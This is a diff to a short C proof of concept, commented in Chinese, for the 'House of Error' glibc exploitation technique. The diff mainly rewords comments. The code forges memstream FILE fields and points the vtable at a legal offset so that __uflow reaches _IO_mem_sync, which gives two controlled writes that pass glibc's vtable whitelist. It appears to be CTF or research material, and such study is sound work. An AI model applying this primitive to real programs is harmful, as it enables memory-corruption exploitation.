@@ -1,10 +1,11 @@
 #define _GNU_SOURCE
 /*
- * House of Error 的 _IO_mem_sync 双写原语：glibc 2.24～2.43，x86-64。
+ * House of Error 的 _IO_mem_sync 双写原语，适用于 glibc 2.24～2.43，x86-64。
  *
- * 这份微型 PoC 只证明最终触发点与合法偏移 vtable，不假装拥有题目中的
- * largebin 任意写或 stderr 劫持。它使用 open_memstream 创建真实的
- * _IO_FILE_memstream，再模拟“能覆盖 FILE 字段”的漏洞。
+ * 这份微型 PoC 只证明最终触发点和合法偏移 vtable 这两件事，不假装自己
+ * 拥有题目里那种 largebin 任意写或 stderr 劫持能力。它用 open_memstream
+ * 创建一个真实的 _IO_FILE_memstream 对象，再模拟一次“能覆盖 FILE 字段”
+ * 的漏洞。
  *
  * 成功判据：
  *   target_pointer == controlled_buffer
@@ -28,8 +29,8 @@ int main(void)
     FILE *fp = open_memstream(&normal_buf, &normal_size);
     assert(fp != NULL);
 
-    /* x86-64 ABI：FILE(0xd8) 后是 vtable(8)、strfile 两个兼容字段，
-       然后才是 memstream 的 bufloc(0xf0) 与 sizeloc(0xf8)。 */
+    /* x86-64 ABI 下，FILE(0xd8) 之后依次是 vtable(8) 和 strfile 的两个
+       兼容字段，再往后才是 memstream 特有的 bufloc(0xf0) 与 sizeloc(0xf8)。 */
     assert(sizeof(FILE) == 0xd8);
     void **vtable_slot = (void **)((char *)fp + sizeof(FILE));
     char ***bufloc_slot = (char ***)((char *)fp + 0xf0);
@@ -39,7 +40,8 @@ int main(void)
     char **saved_bufloc = *bufloc_slot;
     size_t *saved_sizeloc = *sizeloc_slot;
 
-    /* 保存本 PoC 会改的 FILE 字段，触发后恢复，保证 fclose 仍处理真实 buffer。 */
+    /* 先保存本 PoC 会改动的 FILE 字段，触发之后再恢复，这样 fclose 仍能
+       正确处理真实的 buffer。 */
     int saved_flags = fp->_flags;
     int saved_mode = fp->_mode;
     char *saved_read_base = fp->_IO_read_base;
@@ -53,34 +55,37 @@ int main(void)
     char *target_pointer = NULL;
     size_t target_size = 0;
 
-    /* 漏洞模拟：配置 _IO_mem_sync 的两个写。
-       write_ptr != write_end 可避免先走 _IO_str_overflow。 */
+    /* 漏洞模拟：配置好 _IO_mem_sync 会用到的两个写入目标。
+       让 write_ptr != write_end，这样才不会先走进 _IO_str_overflow。 */
     fp->_IO_write_base = controlled_buffer;
     fp->_IO_write_ptr = controlled_buffer + 0x123;
     fp->_IO_write_end = controlled_buffer + 0x1ff;
     *bufloc_slot = &target_pointer;
     *sizeloc_slot = &target_size;
 
-    /* 强制 __uflow 最后执行 vtable 的 uflow 槽。
-       _IO_CURRENTLY_PUTTING=0x800；清掉它避免先切换读写模式。 */
+    /* 强制让 __uflow 最终走到 vtable 的 uflow 槽。
+       _IO_CURRENTLY_PUTTING 对应 0x800；清掉这个标志位，避免提前触发
+       读写模式切换。 */
     fp->_flags &= ~0x800;
     fp->_mode = -1;
     fp->_IO_read_base = NULL;
     fp->_IO_read_ptr = NULL;
     fp->_IO_read_end = NULL;
 
-    /* 在 `_IO_jump_t` 函数表中，uflow 槽偏移为 0x28，sync 槽偏移为 0x60。
-       real_mem_jumps + 0x38 仍在 __libc_IO_vtables 内，可通过白名单。 */
+    /* 在 `_IO_jump_t` 函数表中，uflow 槽的偏移是 0x28，sync 槽的偏移是 0x60。
+       real_mem_jumps + 0x38 这个地址仍落在 __libc_IO_vtables 段内，能通过
+       vtable 白名单校验。 */
     *vtable_slot = (char *)real_mem_jumps + (0x60 - 0x28);
 
     uflow_fn call_uflow = (uflow_fn)dlsym(RTLD_DEFAULT, "__uflow");
     assert(call_uflow != NULL);
-    int result = call_uflow(fp);
+    call_uflow(fp);
 
     assert(target_pointer == controlled_buffer);
     assert(target_size == 0x123);
 
-    /* 清理：恢复真实对象，避免 fclose 把栈 buffer 当作 memstream buffer。 */
+    /* 清理：把各字段恢复成真实对象的值，避免 fclose 把栈上的 buffer 误当
+       成 memstream 的 buffer 来处理。 */
     *vtable_slot = real_mem_jumps;
     *bufloc_slot = saved_bufloc;
     *sizeloc_slot = saved_sizeloc;
